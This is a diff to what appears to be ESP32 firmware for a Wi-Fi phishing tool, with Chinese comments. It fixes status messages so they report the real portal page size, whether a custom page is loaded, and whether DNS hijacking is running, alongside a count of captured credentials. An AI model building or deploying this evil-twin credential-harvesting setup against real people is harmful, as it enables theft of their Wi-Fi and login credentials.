@@ -138,6 +138,14 @@ static const esp_partition_t *storage_part(void)
                                     (esp_partition_subtype_t)0x40, STORAGE_LABEL);
 }
 
+/* 真正会送出的页面大小. phish_html_size() 只数自定义页, 没上传时是 0,
+ * 但门户照样能用内置模板. 只在 START/STATUS 里报 0, 现场会以为页面是空的. */
+static int html_effective_size(void)
+{
+    int n = phish_html_size();
+    return n > 0 ? n : (int)strlen(DEFAULT_HTML);
+}
+
 int phish_html_size(void)
 {
     const esp_partition_t *p = storage_part();
@@ -551,8 +559,9 @@ esp_err_t phish_start(const char *ssid, const char *pass)
         /* 幂等: 重复 start 直接回报当前 AP 实况, 否则 App 侧收不到 START 回执.
          * 顺带把路由重挂一遍, 期间 httpd 可能被 http stop/start 重建过. */
         register_portal_uris(http_server_handle());
-        printf("META,PHISH,START,ssid,%s,ip,%s,dns,1,html_bytes,%d,note,already_on\n",
-               http_server_ap_ssid(), AP_IP_STR, phish_html_size());
+        printf("META,PHISH,START,ssid,%s,ip,%s,dns,%d,html_bytes,%d,custom,%d,note,already_on\n",
+               http_server_ap_ssid(), AP_IP_STR, s_dns_run ? 1 : 0,
+               html_effective_size(), phish_html_size() > 0 ? 1 : 0);
         fflush(stdout);
         return ESP_OK;
     }
@@ -590,8 +599,11 @@ esp_err_t phish_start(const char *ssid, const char *pass)
         }
     }
 
-    printf("META,PHISH,START,ssid,%s,ip,%s,dns,1,html_bytes,%d\n",
-           ssid ? ssid : "(default)", AP_IP_STR, phish_html_size());
+    /* dns 字段必须是真话: 任务没起来还报 1 的话, 现场只会看到
+     * "热点连上了但认证页不弹", 没人知道是 DNS 劫持没跑. */
+    printf("META,PHISH,START,ssid,%s,ip,%s,dns,%d,html_bytes,%d,custom,%d\n",
+           ssid ? ssid : "(default)", AP_IP_STR, s_dns_run ? 1 : 0,
+           html_effective_size(), phish_html_size() > 0 ? 1 : 0);
     fflush(stdout);
     return ESP_OK;
 }
@@ -615,8 +627,9 @@ bool phish_is_on(void) { return s_on; }
 
 void phish_status(void)
 {
-    printf("META,PHISH,STATUS,on,%d,creds,%d,html_bytes,%d,ip,%s\n",
-           s_on ? 1 : 0, s_cred_cnt, phish_html_size(), AP_IP_STR);
+    printf("META,PHISH,STATUS,on,%d,creds,%d,html_bytes,%d,custom,%d,ip,%s\n",
+           s_on ? 1 : 0, s_cred_cnt, html_effective_size(),
+           phish_html_size() > 0 ? 1 : 0, AP_IP_STR);
     fflush(stdout);
 }
 
